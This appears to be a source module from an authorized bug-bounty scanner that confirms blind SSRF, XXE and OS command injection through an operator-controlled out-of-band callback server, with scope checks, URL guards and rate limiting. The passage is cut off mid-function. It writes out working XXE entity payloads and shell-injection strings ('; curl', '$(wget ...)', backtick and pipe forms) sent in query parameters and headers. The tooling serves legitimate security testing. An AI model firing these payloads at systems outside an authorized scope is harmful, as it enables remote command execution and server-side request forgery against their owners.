"""GreyIQ BugHunter — out-of-band (OOB) confirmation via an operator collaborator.

Confirms BLIND vulnerabilities that never reflect anything in the target's own response, by
injecting a unique callback URL that points at the OPERATOR's own OOB collaborator (the
greynoc-chat ``/oob`` endpoint), sending a benign GET probe to the in-scope target, then
polling the collaborator's authenticated ``/api/oob/<token>`` for an inbound hit. A recorded
hit PROVES the target reached out of band.

Four classes live here, and they are here for the same reason: each is INVISIBLE in band, so
the callback is the only observable there is.

* ``confirm_blind_ssrf``  — the server fetches a URL an attacker chose.
* ``confirm_blind_xxe``   — the XML parser resolves an external entity.
* ``confirm_blind_rce``   — request data reaches a command interpreter. The in-pass prover can
  only confirm command injection the target hands back (an echoed arithmetic substitution, or a
  response the injected sleep delays); a command that runs in a worker, a queue consumer or a
  log pipeline returns a fast, identical 200. Note the SECOND control this one carries: a hit
  alone cannot mean execution, because an application that fetches any URL it finds would call
  home too, so a matched bare-URL control on its own token has to stay silent.
* ``confirm_jwt_key_injection`` — the JWT verifier resolves a signing-key URL named by the token
  it is verifying (``jku``/``x5u``), which is unauthenticated account takeover. A server that
  fetches the URL and then rejects the token answers exactly like one that never fetched.

Config (operator-supplied, kept in GreyIQ's secrets store — never hardcoded): the
collaborator BASE URL (your phone's public tunnel, e.g. ``https://chat.example``) and the
``OOB_SECRET`` bearer. The target probe is scope-bound + SSRF-guarded exactly like the
rest of the active prover; the collaborator poll is a separate authenticated call to YOUR
OWN host. Also usable standalone: mint a token, paste the callback URL into a manual XXE /
blind-XSS payload, and poll for the hit.

GET-only target probes, marker-token correlation, bounded polling. Pure/frozen-safe
(stdlib urllib + the existing guarded active HTTP).
"""

from __future__ import annotations

import json
import re
import secrets as _secrets
import time
import urllib.error
import urllib.request
from typing import Any
from urllib.parse import urlparse

# A callback from a SOCIAL UNFURLER or SEARCH CRAWLER is NOT the target's own server-side
# fetch — downgrade such an OOB hit to a candidate. NOTE: generic HTTP-library UAs
# (curl/wget/python-requests/Go-http-client/Java/okhttp) are deliberately NOT here — those
# ARE what a vulnerable server's SSRF fetch typically sends, so they must stay 'confirmed'.
_CRAWLER_UA_RE = re.compile(
    r"\bbot\b|googlebot|bingbot|crawl|spider|slurp|facebookexternalhit|slackbot|"
    r"twitterbot|whatsapp|telegrambot|discordbot|link.?preview|unfurl",
    re.IGNORECASE,
)


def _is_crawler_ua(ua: str) -> bool:
    return bool(_CRAWLER_UA_RE.search(str(ua or "")))

from bughunter import impact_model
from bughunter.active_verify_service import (
    _ActiveError,
    _JWT_RE,
    _b64url_decode,
    _b64url_encode,
    _served_token_carrier,
    _Http,
    _NoRedirect,
    _candidate_params,
    _with_query,
    host_in_active_scope,
)
from bughunter.rate_limit import HostRateGovernor, shared_governor
from bughunter.settings import get_settings
from bughunter.web_ingest import WebsiteFetchError, guarded_dns_scope, normalize_website_url
from bughunter.web_scan_service import _USER_AGENT, _guard_url, current_user_agent


def mint_token() -> str:
    """A unique, unguessable correlation token for one OOB probe."""
    return _secrets.token_hex(16)  # 32 hex chars; matches the collaborator's [A-Za-z0-9]{6,64}


def callback_url(base: str, token: str) -> str:
    """The callback URL the target is asked to reach: <collaborator>/oob/<token>."""
    return f"{str(base or '').rstrip('/')}/oob/{token}"


def poll_collaborator(base: str, secret: str, token: str, *, timeout: float = 8.0) -> dict[str, Any]:
    """GET the collaborator's authed poll endpoint for a token's interactions. Hits the
    OPERATOR's own host (not the target). Returns {ok, count, hits} or {ok: False, error}."""
    base = str(base or "").strip().rstrip("/")
    if not base or not secret:
        return {"ok": False, "error": "OOB collaborator URL + secret are not configured."}
    if not token:
        return {"ok": False, "error": "No token to poll."}
    url = f"{base}/api/oob/{token}"
    request = urllib.request.Request(url, method="GET", headers={
        "Authorization": f"Bearer {secret}", "User-Agent": _USER_AGENT, "Accept": "application/json"})
    try:
        # NOT urlopen(): the default opener FOLLOWS redirects and re-sends the Authorization header
        # to the redirect target, which here is the OOB SECRET. A collaborator that 3xxs -- a tunnel
        # reconfigured, a domain lapsed, a provider interstitial -- would hand that bearer token to
        # whoever now answers. _NoRedirect turns a 3xx into an HTTPError instead, so the secret only
        # ever reaches the host the operator configured.
        opener = urllib.request.build_opener(_NoRedirect())
        with opener.open(request, timeout=timeout) as resp:
            data = json.loads(resp.read(1_000_000).decode("utf-8", "replace"))
    except urllib.error.HTTPError as exc:
        if exc.code == 401:
            return {"ok": False, "error": "collaborator poll unauthorized — check the OOB secret."}
        return {"ok": False, "error": f"collaborator poll HTTP {exc.code}"}
    except (urllib.error.URLError, OSError, ValueError, json.JSONDecodeError, RecursionError) as exc:
        # RecursionError (a RuntimeError subclass, NOT a ValueError) is raised by json.loads on a
        # deeply-nested body ('[' * 100000) that a proxy/LB/MITM on the public tunnel can serve —
        # catch it here so a pathological body degrades to a graceful error, never aborts the sweep.
        return {"ok": False, "error": f"collaborator poll failed: {exc}"}
    # The collaborator's response may not be a JSON object (a misconfigured tunnel/proxy,
    # a load-balancer error page rendered as JSON, or a buggy collaborator could return an
    # array/string/number) — normalize to {} so a non-dict body never crashes the poll.
    data = data if isinstance(data, dict) else {}
    # A dict body can still carry wrong-typed fields. Coerce defensively: a non-int-convertible
    # count (e.g. "N/A", a list/dict) degrades to 0 instead of raising outside the try, and hits
    # is reduced to a list of dict entries so a confirm site can require a genuine dict hit before
    # treating count>0 as a proven callback (a non-list/empty hits must never false-confirm).
    try:
        count = int(data.get("count") or 0)
    except (TypeError, ValueError):
        count = 0
    raw_hits = data.get("hits")
    hits = [h for h in raw_hits if isinstance(h, dict)] if isinstance(raw_hits, list) else []
    # The NESTED "headers" of each hit was never checked, and every confirm site reads it as
    # (hit.get("headers") or {}).get("user-agent") -- so a hit carrying headers as a string or a list
    # (the same tainted-tunnel threat model the coercions above exist for) raised AttributeError out
    # of the prover. Normalise it here, once, rather than at each of the five read sites.
    # Coerce only a PRESENT-but-wrong-typed value; an absent key is left absent, because the read
    # sites already spell it (hit.get("headers") or {}) and inventing the key would change the hit
    # shape every caller and test sees.
    for hit in hits:
        if "headers" in hit and not isinstance(hit["headers"], dict):
            hit["headers"] = {}
    return {"ok": True, "count": count, "hits": hits}


def _build_ssrf_finding(target_url: str, param: str, token: str, base: str, hit: dict[str, Any], confirmed: bool = True) -> dict[str, Any]:
    word = "confirmed" if confirmed else "callback from a non-server source — candidate"
    plan = _ssrf_plan(target_url, param, token, base, hit, confirmed)
    return {
        "rule_id": "active.blind-ssrf-oob",
        "title": f"Blind SSRF via '{param}' (out-of-band {word})",
        "severity": "high",
        "confidence": "high" if confirmed else "medium",
        "category": "ssrf",
        "location": target_url,
        "file_path": target_url,
        "line_start": 1, "line_end": 1,
        "class_id": "ssrf",
        "class_name": "Server-side request forgery (SSRF)",
        "cwe": "CWE-918",
        "owasp": "A10:2021 Server-Side Request Forgery (SSRF)",
        "references": [
            "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
            "https://portswigger.net/web-security/ssrf",
        ],
        "remediation": ("Validate and allow-list the outbound destination; resolve and pin it, reject internal/"
                        "metadata ranges, and disable unused URL schemes/redirfollowing."),
        "snippet": "",  # the proof is the OOB callback, not target data
        # Active-proof carriers so a hunt that appends this finding renders it confirmed (with the
        # collaborator hit as the observed-vs-fresh-token-control differential), exactly like the
        # in-active-pass checks — not downgraded to a deterministic 'candidate'.
        "_active_class_hint": "ssrf",
        "_active_proof": plan["proof_of_impact"],
        "_active_cvss": plan["cvss"],
        "proof_evidence": {
            "request_line": f"GET {_with_query(target_url, {param: callback_url(base, token)})}",
            "response_status": f"collaborator hit: {hit.get('method', 'GET')} {hit.get('path', '/oob/' + token)}",
            "matched_value": (f"an out-of-band {hit.get('method', 'GET')} request reached the collaborator token "
                              f"{token} (source {hit.get('ip', '?')}, UA {(hit.get('headers') or {}).get('user-agent', '?')}) "
                              f"after '{param}' was set to the callback URL — "
                              + ("blind SSRF confirmed (the fresh token was empty before the probe)"
                                 if confirmed else "but the source looks like a crawler/preview bot, not the target's own fetch; verify the source before submitting")),
        },
    }


def _ssrf_plan(target_url: str, param: str, token: str, base: str, hit: dict[str, Any], confirmed: bool = True) -> dict[str, Any]:
    cb = callback_url(base, token)
    return {
        "steps": [
            f"Set the '{param}' parameter to a callback URL on a collaborator you control: {cb}",
            f"Send: GET {_with_query(target_url, {param: cb})}",
            f"Observe an inbound {hit.get('method', 'GET')} hit on the collaborator for token {token} "
            f"(from {hit.get('ip', 'the target')}) — the server fetched the attacker-supplied URL.",
            "Re-point the parameter at an internal/metadata URL (in scope) to assess reachability and impact.",
        ],
        "poc": f"GET {_with_query(target_url, {param: cb})}\n# -> out-of-band callback recorded at {base}/oob/{token}",
        "impact": ("The server can be made to issue requests to attacker-chosen hosts — internal services, cloud "
                   "metadata (credential theft), and otherwise-unreachable infrastructure behind the firewall."),
        # Derived from the vector (this one is 7.7, not the 8.5 that was hardcoded) so the printed
        # score and the vector beside it can never disagree — see impact_model.cvss_block.
        "cvss": impact_model.cvss_block(
            "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
            estimated=not confirmed,
            justification=(
                "Actively confirmed with a real out-of-band collaborator hit correlated to a fresh, unguessable "
                "token — not a template estimate." if confirmed else
                "The callback source doesn't look like the target's own server-side fetch (crawler/preview-bot "
                "UA); confirm the source before treating this as proven."
            ),
        ),
        "remediation": "Allow-list outbound destinations; block internal/metadata ranges; pin the resolved IP.",
        "proof_of_impact": {
            "status": "confirmed" if confirmed else "candidate",
            "method": "out-of-band callback (collaborator) — GET-only probe, no data exfiltrated into the report",
            "affected_asset": "internal services and cloud metadata reachable from the server",
            "observed_result": (f"setting '{param}' to the collaborator URL caused the target to make an out-of-band "
                                f"{hit.get('method', 'GET')} request to token {token}"),
            "control_result": "without the injected callback the collaborator records nothing for this fresh token",
            "evidence": f"collaborator interaction for token {token} ({hit.get('method', 'GET')} {hit.get('path', '')})",
        },
    }


def confirm_blind_ssrf(
    target_url: str,
    *,
    base: str,
    secret: str,
    scope: str = "",
    settings: Any = None,
    extra_params: list[str] | None = None,
    priority: list[str] | None = None,
    governor: HostRateGovernor | None = None,
    http: _Http | None = None,
    poll_attempts: int = 4,
    poll_delay_s: float = 2.0,
) -> dict[str, Any]:
    """Inject a fresh collaborator callback URL into each candidate param of an in-scope
    target, send a GET probe, and poll the collaborator for a hit. Returns
    ``{ok, status, finding?, attack_plan?, detail}``; status is ``confirmed`` (a hit
    landed) or ``no-callback`` (none did)."""
    settings = settings or get_settings()
    if not str(base or "").strip() or not str(secret or "").strip():
        return {"ok": False, "error": "Configure the OOB collaborator URL + secret first."}
    try:
        normalized = normalize_website_url(target_url)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": str(exc)}
    host = urlparse(normalized).hostname or ""
    if not host_in_active_scope(host, scope, settings):
        return {"ok": False, "error": f"'{host}' is not named in your scope — OOB probing is fail-closed."}
    try:
        sanitized = _guard_url(normalized, settings.allow_private_urls, settings.web_allowed_ports)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": f"target refused by the URL guard: {exc}"}

    # The PROCESS-WIDE bucket by default, not a private one. A caller that omits governor= (the API
    # confirm routes do) was otherwise handed its own allowance, so the per-host ceiling the settings
    # call process-wide was really that number once per prover, and concurrent hunts against one host
    # sent their OOB traffic entirely outside the budget the main active pass draws down.
    governor = governor or shared_governor(
        capacity=settings.active_max_requests_per_host, min_interval_s=settings.active_min_interval_ms / 1000.0)
    http = http or _Http(settings, governor, max_requests=10)
    # The brain's SSRF picks (params it judges take a URL/host here — image_url, webhook, feed, …) are
    # tried FIRST, so the budget-heavy blind probe lands on target-specific URL-takers the generic
    # defaults miss. Names only; the probe supplies the callback URL and confirms via the collaborator.
    params = _candidate_params(sanitized, extra_params, ("url", "next", "dest", "uri", "callback", "u"), 3, priority=priority)
    tried: list[str] = []
    poll_errors: list[str] = []
    for param in params:
        token = mint_token()
        # Pre-probe NEGATIVE CONTROL: the fresh, unguessable token must be empty. If it
        # already carries hits (collision / a shared collaborator), skip it — we can't
        # attribute a later hit to our probe.
        pre = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
        if not pre.get("ok"):
            poll_errors.append(pre.get("error", "poll failed"))
            continue
        if pre.get("count"):
            continue
        probe_url = _with_query(sanitized, {param: callback_url(base, token)})
        try:
            http.fetch(probe_url)  # the target makes the OOB call if vulnerable
        except (_ActiveError, WebsiteFetchError):
            # WebsiteFetchError (a ValueError subclass) is raised by _Http.fetch's own
            # normalize_website_url()/_guard_url() -- e.g. this param's probe_url grew
            # past MAX_URL_LENGTH, or the host's DNS answer changed to something
            # private between the initial guard and now. Skip just this param, same
            # as _ActiveError -- it must never abort the whole sweep.
            continue
        tried.append(param)
        for _ in range(max(1, poll_attempts)):
            time.sleep(max(0.0, poll_delay_s))
            res = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
            if not res.get("ok"):
                poll_errors.append(res.get("error", "poll failed"))
                break  # transient poll failure for THIS param — move on, don't abort the sweep
            if res.get("count") and res.get("hits"):
                # The token went 0 -> N only AFTER our probe, and it is unguessable, so the
                # callback resulted from this probe. Require a real dict hit (not just a
                # positive count) so a malformed count>0/hits=[] body can't false-confirm.
                # A known crawler/bot/link-preview UA is downgraded to a CANDIDATE (it may be
                # a log-scanner / unfurler, not the target's own server-side fetch).
                hit = (res.get("hits") or [{}])[0]
                ua = (hit.get("headers") or {}).get("user-agent", "")
                confirmed = not _is_crawler_ua(ua)
                finding = _build_ssrf_finding(sanitized, param, token, base, hit, confirmed)
                finding["ref"] = "F1"
                return {"ok": True, "status": "confirmed" if confirmed else "candidate",
                        "param": param, "token": token, "finding": finding,
                        "attack_plan": _ssrf_plan(sanitized, param, token, base, hit, confirmed),
                        "detail": {"hit": hit, "negative_control": "the fresh token was empty before the probe"}}
    if not tried and poll_errors:
        return {"ok": False, "error": poll_errors[0]}
    return {"ok": True, "status": "no-callback", "params_tried": tried, "poll_errors": poll_errors,
            "reason": "no out-of-band callback was observed for these parameters (no blind SSRF proven here)."}


# ---- Blind XXE over OOB -------------------------------------------------------------------
def build_xxe_payloads(base: str, token: str) -> dict[str, str]:
    """Ready-to-deliver blind-XXE payload variants with the collaborator callback embedded as
    an EXTERNAL ENTITY. The entity only makes the parser fetch the callback (proving external-
    entity resolution) — it reads NO target file, so confirmation never exfiltrates data.
    The operator pastes one of these into an XML-parsing endpoint (or GreyIQ POSTs ``classic``
    via the opt-in --send)."""
    cb = callback_url(base, token)
    return {
        "classic": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
                    f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{cb}">]>\n<r>&xxe;</r>'),
        "parameter_entity": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
                             f'<!DOCTYPE r [<!ENTITY % ext SYSTEM "{cb}"> %ext;]>\n<r>probe</r>'),
        "svg": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{cb}">]>\n'
                f'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">&xxe;</svg>'),
        "soap": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
                 f'<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "{cb}">]>\n'
                 f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                 f'<soap:Body><probe>&xxe;</probe></soap:Body></soap:Envelope>'),
    }


def _post_xml(url: str, xml: str, *, timeout: float) -> dict[str, Any]:
    """POST a fixed XML body to an ALREADY scope-checked + SSRF-guarded URL, never following a
    redirect (so the body can't be replayed off-host). The only non-GET egress in the engine,
    reached solely via the opt-in --send. An HTTP error response is fine — the external entity
    may still have been resolved during parsing before the error was produced."""
    request = urllib.request.Request(
        url, data=xml.encode("utf-8"), method="POST",
        headers={"Content-Type": "application/xml", "User-Agent": current_user_agent(_USER_AGENT), "Accept": "*/*"})
    opener = urllib.request.build_opener(_NoRedirect())
    try:
        with opener.open(request, timeout=timeout) as resp:
            return {"ok": True, "status": getattr(resp, "status", 0)}
    except urllib.error.HTTPError as exc:
        return {"ok": True, "status": exc.code}
    except (urllib.error.URLError, OSError, ValueError) as exc:
        return {"ok": False, "error": f"XML POST failed: {exc}"}


def _build_xxe_finding(target_url: str, token: str, base: str, hit: dict[str, Any], confirmed: bool = True) -> dict[str, Any]:
    word = "confirmed" if confirmed else "callback from a non-server source — candidate"
    ua = (hit.get("headers") or {}).get("user-agent", "?")
    return {
        "rule_id": "active.blind-xxe-oob",
        "title": f"Blind XXE (out-of-band {word})",
        "severity": "high",
        "confidence": "high" if confirmed else "medium",
        "category": "xxe",
        "location": target_url,
        "file_path": target_url,
        "line_start": 1, "line_end": 1,
        "class_id": "xxe",
        "class_name": "XML External Entity (XXE)",
        "cwe": "CWE-611",
        "owasp": "A05:2021 Security Misconfiguration",
        "references": [
            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
            "https://portswigger.net/web-security/xxe/blind",
        ],
        "remediation": ("Disable external-entity and DTD processing in the XML parser (set FEATURE_SECURE_PROCESSING / "
                        "disallow-doctype-decl; for libxml2 do not set NOENT/DTDLOAD). Prefer a hardened parser config."),
        "snippet": "",  # the proof is the OOB callback, not any file contents — nothing is exfiltrated
        "proof_evidence": {
            "request_line": f"POST {target_url}  (Content-Type: application/xml)",
            "response_status": f"collaborator hit: {hit.get('method', 'GET')} {hit.get('path', '/oob/' + token)}",
            "matched_value": (f"the XML parser resolved an external entity and made an out-of-band "
                              f"{hit.get('method', 'GET')} request to collaborator token {token} "
                              f"(source {hit.get('ip', '?')}, UA {ua}) — "
                              + ("blind XXE confirmed (the fresh token was empty before the probe)" if confirmed
                                 else "but the source looks like a crawler/preview bot; verify the source before submitting")),
        },
    }


def _xxe_plan(target_url: str, token: str, base: str, hit: dict[str, Any], confirmed: bool = True) -> dict[str, Any]:
    cb = callback_url(base, token)
    return {
        "steps": [
            f"Submit an XML document containing an external entity pointing at a collaborator you control: {cb}",
            f"Send it to the XML-parsing endpoint at {target_url} (Content-Type: application/xml).",
            f"Observe an inbound {hit.get('method', 'GET')} hit on the collaborator for token {token} "
            f"(from {hit.get('ip', 'the target')}) — the parser resolved the external entity.",
            "Escalate within scope: swap the entity for an internal/metadata URL (blind SSRF via XXE) or a "
            "parameter-entity exfil chain to read local files — only as far as your authorization allows.",
        ],
        "poc": f"POST {target_url}\nContent-Type: application/xml\n\n{build_xxe_payloads(base, token)['classic']}\n"
               f"# -> out-of-band callback recorded at {cb}",
        "impact": ("XML external-entity processing lets an attacker make the server fetch attacker-chosen URLs "
                   "(internal services, cloud metadata) and, depending on the parser, read local files — SSRF and "
                   "file disclosure from a single XML submission."),
        "cvss": impact_model.cvss_block(
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
            estimated=not confirmed,
            justification=(
                "Actively confirmed with a real out-of-band collaborator hit correlated to a fresh, unguessable "
                "token — not a template estimate." if confirmed else
                "The callback source doesn't look like the target's own server-side fetch (crawler/preview-bot "
                "UA); confirm the source before treating this as proven."
            ),
        ),
        "remediation": "Disable DTDs / external-entity resolution in the XML parser; use a hardened, secure-processing config.",
        "proof_of_impact": {
            "status": "confirmed" if confirmed else "candidate",
            "method": "out-of-band callback (collaborator) — the external entity only fetches the callback; no file is exfiltrated into the report",
            "affected_asset": "internal services / cloud metadata (via XXE-SSRF) and, depending on the parser, local files",
            "observed_result": f"the XML parser at the endpoint made an out-of-band {hit.get('method', 'GET')} request to token {token}",
            "control_result": "without the injected external entity the collaborator records nothing for this fresh token",
            "evidence": f"collaborator interaction for token {token} ({hit.get('method', 'GET')} {hit.get('path', '')})",
        },
    }


def _xxe_finding_from_hit(sanitized: str, token: str, base: str, hit: dict[str, Any]) -> dict[str, Any]:
    ua = (hit.get("headers") or {}).get("user-agent", "")
    confirmed = not _is_crawler_ua(ua)
    finding = _build_xxe_finding(sanitized, token, base, hit, confirmed)
    finding["ref"] = "F1"
    plan = _xxe_plan(sanitized, token, base, hit, confirmed)
    # Active-proof carriers so a hunt that appends this finding renders it CONFIRMED (with the
    # collaborator hit as the observed-vs-fresh-token-control differential), exactly like the SSRF
    # sibling (_build_ssrf_finding). Without them the fold-in drops the differential and a genuinely
    # OOB-proven XXE renders 'missing' (class 'xxe' isn't a deterministic-artifact category).
    finding["_active_class_hint"] = "xxe"
    finding["_active_proof"] = plan["proof_of_impact"]
    finding["_active_cvss"] = plan["cvss"]
    return {"ok": True, "status": "confirmed" if confirmed else "candidate", "token": token,
            "finding": finding, "attack_plan": plan,
            "detail": {"hit": hit, "negative_control": "the fresh token was empty before the probe"}}


def confirm_blind_xxe(
    target_url: str,
    *,
    base: str,
    secret: str,
    scope: str = "",
    send: bool = False,
    token: str | None = None,
    settings: Any = None,
    poll_attempts: int = 4,
    poll_delay_s: float = 2.0,
) -> dict[str, Any]:
    """Confirm blind XXE out-of-band. Two modes:

    * **Assisted (default, GET-only):** mint a token, hand back ready XXE payload variants with
      the callback embedded (status ``ready``); the operator delivers one to an XML endpoint,
      then re-calls with the SAME ``token`` to poll — a recorded hit builds the confirmed finding.
    * **Auto (``send=True``):** GreyIQ itself POSTs the ``classic`` payload to the in-scope,
      SSRF-guarded target (the only non-GET egress), then polls. Negative-control + crawler-UA
      hardening identical to the SSRF path.
    """
    settings = settings or get_settings()
    if not str(base or "").strip() or not str(secret or "").strip():
        return {"ok": False, "error": "Configure the OOB collaborator URL + secret first."}
    try:
        normalized = normalize_website_url(target_url)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": str(exc)}
    host = urlparse(normalized).hostname or ""
    if not host_in_active_scope(host, scope, settings):
        return {"ok": False, "error": f"'{host}' is not named in your scope — OOB probing is fail-closed."}
    try:
        sanitized = _guard_url(normalized, settings.allow_private_urls, settings.web_allowed_ports)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": f"target refused by the URL guard: {exc}"}

    fresh = not str(token or "").strip()
    token = str(token or "").strip() or mint_token()
    payloads = build_xxe_payloads(base, token)

    if send:
        # Pre-probe NEGATIVE CONTROL before we POST: the token must be empty, else a later hit
        # can't be attributed to our probe.
        pre = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
        if not pre.get("ok"):
            return {"ok": False, "error": pre.get("error", "collaborator poll failed")}
        if pre.get("count"):
            return {"ok": False, "error": "the collaborator token already has hits before the probe — mint a fresh one and retry."}
        # Re-validate + pin the DNS resolution IMMEDIATELY before the real POST (rather
        # than relying on the guard check higher up, which happened before the
        # collaborator round-trips above) so an attacker-controlled DNS server can't
        # rebind the target hostname to a private/metadata IP in the gap between the
        # guard and the actual connection. See web_ingest.guarded_dns_scope().
        with guarded_dns_scope():
            try:
                _guard_url(sanitized, settings.allow_private_urls, settings.web_allowed_ports)
            except WebsiteFetchError as exc:
                return {"ok": False, "error": f"target refused by the URL guard: {exc}"}
            post = _post_xml(sanitized, payloads["classic"], timeout=settings.web_fetch_timeout_seconds)
        if not post.get("ok"):
            return {"ok": True, "status": "send-failed", "token": token, "payloads": payloads, "error": post.get("error")}
        poll_errors: list[str] = []
        for _ in range(max(1, poll_attempts)):
            time.sleep(max(0.0, poll_delay_s))
            res = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
            if not res.get("ok"):
                poll_errors.append(res.get("error", "poll failed"))
                break
            # Require a genuine dict hit, not just count>0, so a malformed collaborator body
            # (count>0 with empty/non-list hits) can't fabricate a confirmed XXE finding.
            if res.get("count") and res.get("hits"):
                return _xxe_finding_from_hit(sanitized, token, base, (res.get("hits") or [{}])[0])
        return {"ok": True, "status": "no-callback", "token": token, "sent": True, "payloads": payloads,
                "poll_errors": poll_errors,
                "reason": "the payload was sent (POST) but no out-of-band callback was observed (no blind XXE proven here)."}

    # Assisted mode.
    if fresh:
        return {"ok": True, "status": "ready", "token": token, "payloads": payloads,
                "callback_url": callback_url(base, token),
                "reason": (f"Deliver one of these XXE payloads to an XML-parsing endpoint out of band, then re-run with "
                           f"token {token} to poll for the callback (or pass send=True to have GreyIQ POST the classic payload).")}
    # Re-poll a token the operator already delivered to (its negative control was the fresh mint).
    res = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
    if not res.get("ok"):
        return {"ok": False, "error": res.get("error", "collaborator poll failed")}
    if res.get("count") and res.get("hits"):  # a real dict hit is required, not just a count
        return _xxe_finding_from_hit(sanitized, token, base, (res.get("hits") or [{}])[0])
    return {"ok": True, "status": "no-callback", "token": token, "payloads": payloads,
            "reason": "no callback yet for this token — deliver the payload to an XML endpoint, then poll again."}


# ---- Blind OS command injection (RCE) over OOB ---------------------------------------------
# The prover could already confirm command injection two ways -- an ECHOED arithmetic substitution
# (_check_rce_command_injection) and a bounded SLEEP differential (_check_time_rce, opt-in). Both
# need the target to hand something back: the first needs the command's OUTPUT reflected in the
# response, the second needs the response itself to be delayed. Real unauthenticated RCE frequently
# does neither -- the injected command runs in a worker, a queue consumer, a log pipeline or an
# async job, and the HTTP response is a fast, identical 200 either way. That was the largest
# unauthenticated-RCE recall hole in the engine, and it is exactly the shape the collaborator
# already solves for SSRF and XXE: let the TARGET tell us out of band that it executed.
#
# The probe asks a server-side shell to fetch one unguessable callback URL. Only an HTTP GET by
# curl/wget ever runs: nothing on the target is read, written or deleted, and the payload carries
# no second command.
_RCE_OOB_PARAMS: tuple[str, ...] = ("cmd", "command", "exec", "ping", "host", "ip", "domain", "target", "q")

# Headers that reach a shell far more often than a query parameter does on an UNAUTHENTICATED
# request -- they are attacker-controlled on every request, need no parameter to exist, and land in
# log processors, analytics shell-outs and `ping`/`whois`-style helpers that interpolate them.
_RCE_OOB_HEADERS: tuple[str, ...] = ("User-Agent", "Referer", "X-Forwarded-For")


def build_rce_payloads(base: str, token: str) -> dict[str, str]:
    """The shell-context variants that make a server-side shell fetch the collaborator callback.

    Each value is the payload for ONE injection context (command separator, ``$()`` substitution,
    backtick substitution, pipe, newline). Every variant carries curl AND wget so a container image
    shipping only one of them still calls home on the same probe. Handed back for manual delivery
    the way ``build_xxe_payloads`` is, and combined by ``_rce_probe_value`` for the automatic sweep.
    """
    cb = callback_url(base, token)
    fetch = "curl -s {0} || wget -q -O- {0}".format(cb)
    return {
        "separator": ";" + fetch,
        "substitution": "$(" + fetch + ")",
        "backtick": "`" + fetch + "`",
        "pipe": "|" + fetch,
        "newline": "\n" + fetch,
    }


# The combined probe rides in ONE query value, and web_ingest.MAX_URL_LENGTH (2048) rejects the whole
# request once the encoded URL outgrows it -- SILENTLY, because _Http.fetch raises WebsiteFetchError
# and the sweep below skips that parameter. The collaborator base is operator-supplied and can be a
# long tunnel hostname, so the payload has to be built to a budget rather than assumed to fit:
# percent-encoding roughly doubles it (every ':' '/' ' ' '$' '|' becomes three characters), so a raw
# cap of 700 keeps the encoded value near 1.5 KB and leaves room for the target's own path and query.
_RCE_PROBE_MAX_RAW = 700

# ONE fetch binary per context instead of both in every context: the curl-AND-wget pair doubles the
# number of callback URLs in the combined value and is exactly what pushes a long collaborator base
# over the budget above. Alternating keeps BOTH binaries represented across the probe at half the
# length. build_rce_payloads() still emits the curl-or-wget form for manual delivery, where the
# operator pastes a single variant and length costs nothing.
_RCE_PROBE_ORDER: tuple[tuple[str, str], ...] = (
    ("separator", "curl -s {0}"),
    ("substitution", "wget -q -O- {0}"),
    ("backtick", "curl -s {0}"),
    ("pipe", "wget -q -O- {0}"),
    ("newline", "curl -s {0}"),
)
_RCE_WRAPPERS: dict[str, str] = {
    "separator": ";{0}", "substitution": "$({0})", "backtick": "`{0}`", "pipe": "|{0}", "newline": "\n{0}",
}


def _header_value(name: str, payload: str) -> str:
    """The value to send in header ``name``, keeping any identity that header is meant to carry.

    User-Agent is the header a bug-bounty program can REQUIRE its researcher marker on, so the
    payload is appended to the real UA rather than replacing it -- every shell context opens with
    its own separator, so appending is exactly as injectable and leaves the traffic attributable.
    Referer and X-Forwarded-For carry no identity, so they take the payload alone."""
    if name.lower() == "user-agent":
        return "{0} {1}".format(current_user_agent(_USER_AGENT), payload)
    return payload


def _rce_probe_value(base: str, token: str, max_len: int = _RCE_PROBE_MAX_RAW,
                     header_safe: bool = False) -> str:
    """Every shell context that fits ``max_len``, in ONE value, all pointing at the SAME token.

    ``header_safe`` drops the newline context. A query parameter carries a newline fine (it is
    percent-encoded to %0A on the way out), but an HTTP header value CANNOT: http.client rejects a
    header containing CR or LF outright with ValueError — correctly, since that is request splitting.
    Without this the entire header phase raised on its very first send, every time, and the class of
    injection point that needs no parameter to exist was silently never probed.

    One request per context would cost five requests per parameter and spend the whole active budget
    on a target that is not injectable at all -- the overwhelmingly common case. Combining them costs
    one. Attribution is not lost in any way a submission cares about: the reported proof-of-concept is
    the exact request that produced the callback, so it reproduces verbatim, and ``build_rce_payloads``
    hands the operator the per-context variants to narrow it afterwards.

    The first context is always included even when it alone exceeds the budget -- a truncated probe is
    still a real probe, whereas returning nothing would quietly disable the sweep.
    """
    cb = callback_url(base, token)
    out = ""
    for name, fetch in _RCE_PROBE_ORDER:
        if header_safe and name == "newline":
            continue
        piece = _RCE_WRAPPERS[name].format(fetch.format(cb))
        if out and len(out) + len(piece) > max_len:
            break
        out += piece
    return out


def _build_rce_finding(target_url: str, where: str, token: str, base: str, hit: dict[str, Any],
                       probe_request: str, confirmed: bool = True) -> dict[str, Any]:
    word = "confirmed" if confirmed else "callback from a non-server source — candidate"
    plan = _rce_plan(target_url, where, token, base, hit, probe_request, confirmed)
    return {
        "rule_id": "active.blind-rce-oob",
        "title": "Blind OS command injection via {0} (out-of-band {1})".format(where, word),
        "severity": "critical",
        "confidence": "high" if confirmed else "medium",
